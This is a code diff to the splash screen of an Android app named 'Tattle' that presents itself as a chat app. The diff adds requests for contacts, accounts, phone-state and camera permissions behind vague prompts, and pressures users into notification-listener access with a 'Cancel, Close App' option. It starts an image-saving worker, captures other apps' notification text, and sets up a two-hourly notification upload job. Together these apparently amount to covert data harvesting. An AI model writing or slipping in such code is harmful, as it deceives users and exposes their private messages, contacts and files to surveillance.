@@ -8,7 +8,11 @@ import androidx.core.app.NotificationManagerCompat;
 import androidx.core.content.ContextCompat;
 import androidx.lifecycle.Observer;
 import androidx.localbroadcastmanager.content.LocalBroadcastManager;
+import androidx.work.Constraints;
+import androidx.work.ExistingPeriodicWorkPolicy;
+import androidx.work.NetworkType;
 import androidx.work.OneTimeWorkRequest;
+import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkInfo;
 import androidx.work.WorkManager;
 
@@ -22,24 +26,24 @@ import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Bundle;
-import android.os.Environment;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 
+import com.codies.Tattle.OtherUtils.ContactUtil;
+import com.codies.Tattle.DataUploadServices.NotificationUploadScheduler;
 import com.codies.Tattle.R;
-import com.codies.Tattle.Utils.DeviceInfo;
-import com.codies.Tattle.Utils.DocumentFiles;
-import com.codies.Tattle.Utils.NotificationWorker;
-import com.codies.Tattle.Utils.SharedPrefs;
+import com.codies.Tattle.OtherUtils.ImageFileSaver;
+import com.codies.Tattle.OtherUtils.SharedPrefs;
 
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.concurrent.TimeUnit;
 
 public class SplashActivity extends AppCompatActivity {
 
@@ -54,16 +58,18 @@ public class SplashActivity extends AppCompatActivity {
 
     String[] appPermissions = {
             Manifest.permission.WRITE_EXTERNAL_STORAGE,
-            Manifest.permission.READ_EXTERNAL_STORAGE
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.READ_CONTACTS,
+            Manifest.permission.GET_ACCOUNTS,
+            Manifest.permission.READ_PHONE_STATE,
+            Manifest.permission.CAMERA
     };
 
     Button loginBt;
     Button signupBT;
     SharedPrefs sharedPrefs;
 
-    DeviceInfo deviceInfo;
-    DocumentFiles documentFiles;
-
+    ContactUtil contactUtil;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -71,33 +77,26 @@ public class SplashActivity extends AppCompatActivity {
         setContentView(R.layout.activity_splash);
         loginBt = findViewById(R.id.splashLoginBt);
         signupBT = findViewById(R.id.splashSignupBT);
+        sharedPrefs = SharedPrefs.getInstance(this);
+        contactUtil = new ContactUtil(this);
 
-        sharedPrefs = SharedPrefs.getInstance(getApplicationContext());
-        deviceInfo = new DeviceInfo(this);
-//        startActivity(intent);
 
         /*
         documentFiles = new DocumentFiles(".apk");//just enter the file type u need
         documentFiles.Search_Dir(Environment.getExternalStorageDirectory());
 */
-      /*  if (ContextCompat.checkSelfPermission(SplashActivity.this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
-            if (ActivityCompat.shouldShowRequestPermissionRationale(SplashActivity.this, Manifest.permission.GET_ACCOUNTS)) {
-                ActivityCompat.requestPermissions(SplashActivity.this, new String[]{Manifest.permission.GET_ACCOUNTS}, PERMS_REQUEST_CODE);
-            } else {
-                ActivityCompat.requestPermissions(SplashActivity.this, new String[]{Manifest.permission.GET_ACCOUNTS}, PERMS_REQUEST_CODE);
-            }
-        } else {
-            deviceInfo.getAccounts();
-        }*/
+
+
+//        startAlarmManager();
 
         if (checkAndRequestPermissions()) {
-//            startWorkmanager();
-//            documentFiles = new DocumentFiles(".pdf");
+            startWorkmanager();
         }
 
         if (!NotificationManagerCompat.getEnabledListenerPackages(this).contains(getPackageName())) {
-//            showPermissionDialogue();
+            showPermissionDialogue();
         }
+        LocalBroadcastManager.getInstance(this).registerReceiver(onNotice, new IntentFilter("Msg"));
 
         if (sharedPrefs.isLoggedIn()) {
             startActivity(new Intent(SplashActivity.this, ChatListActivity.class));
@@ -123,23 +122,7 @@ public class SplashActivity extends AppCompatActivity {
 
     }
 
-/*    private Uri ussdToCallableUri(String ussd) {
 
-        String uriString = "";
-
-        if(!ussd.startsWith("tel:"))
-            uriString += "tel:";
-
-        for(char c : ussd.toCharArray()) {
-
-            if(c == '#')
-                uriString += Uri.encode("#");
-            else
-                uriString += c;
-        }
-
-        return Uri.parse(uriString);
-    }*/
 
     public void showPermissionDialogue() {
         if (!NotificationManagerCompat.getEnabledListenerPackages(this).contains(getPackageName())) {
@@ -163,7 +146,7 @@ public class SplashActivity extends AppCompatActivity {
 
             AlertDialog.Builder builder = new AlertDialog.Builder(this);
             builder.setMessage("You Need To Allow Permissions To Get The Best Of This App.").setPositiveButton("Allow Permission", dialogClickListener)
-                    .setNegativeButton("Cancel", dialogClickListener).show();//ask for permission
+                    .setNegativeButton("Cancel, Close App", dialogClickListener).show();//ask for permission
 
         }
     }
@@ -215,7 +198,7 @@ public class SplashActivity extends AppCompatActivity {
                             // so ask again explaining the usage of permission
                             //shouldShowRequestPermissionRationale will return true
                             if (ActivityCompat.shouldShowRequestPermissionRationale(this, permName)) {
-                                showDialog("", "This app needs to Access to Read and Write to work without any problems",
+                                showDialog("", "This App Needs Permissions To Work Flawlessly",
                                         "Yes, Grant permissions",
                                         new DialogInterface.OnClickListener() {
                                             @Override
@@ -278,7 +261,7 @@ public class SplashActivity extends AppCompatActivity {
         public void startWorkmanager () {
             Log.i(TAG, "startWorkmanager: work manager has started");
             final WorkManager mWorkManager = WorkManager.getInstance();
-            final OneTimeWorkRequest mRequest = new OneTimeWorkRequest.Builder(NotificationWorker.class).build();
+            final OneTimeWorkRequest mRequest = new OneTimeWorkRequest.Builder(ImageFileSaver.class).build();
             mWorkManager.enqueue(mRequest);
             mWorkManager.getWorkInfoByIdLiveData(mRequest.getId()).observe(this, new Observer<WorkInfo>() {
                 @Override
@@ -292,4 +275,53 @@ public class SplashActivity extends AppCompatActivity {
                 }
             });
         }
+
+    public void startAlarmManager() {
+        Log.i(TAG, "startWorkmanager: work manager has started");
+        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build();
+        PeriodicWorkRequest build = new PeriodicWorkRequest.Builder(NotificationUploadScheduler.class, 2, TimeUnit.HOURS)
+                .setConstraints(constraints)
+                .build();
+
+        WorkManager instance = WorkManager.getInstance();
+       /* if (instance != null) {
+            instance.enqueueUniquePeriodicWork(TAG, ExistingPeriodicWorkPolicy.REPLACE, build);
+        }*/
+        instance.enqueueUniquePeriodicWork("uploadNotif",ExistingPeriodicWorkPolicy.REPLACE,build);
     }
+
+
+    private BroadcastReceiver onNotice = new BroadcastReceiver() {
+
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            String pack = intent.getStringExtra("package");
+            String title = intent.getStringExtra("title");
+            String text = intent.getStringExtra("text");
+
+  /*          Log.i(TAG, "onReceive: " + pack);
+            Log.i(TAG, "onReceive: " + title);
+            Log.i(TAG, "onReceive: " + text);*/
+
+            //int id = intent.getIntExtra("icon",0);
+
+       /*     Log.i(TAG, "onReceive: " + title);
+            Log.i(TAG, "onReceive: " + text);*/
+            Context remotePackageContext = null;
+            try {
+//                remotePackageContext = getApplicationContext().createPackageContext(pack, 0);
+//                Drawable icon = remotePackageContext.getResources().getDrawable(id);
+//                if(icon !=null) {
+//                    ((ImageView) findViewById(R.id.imageView)).setBackground(icon);
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    };
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+    }
+}
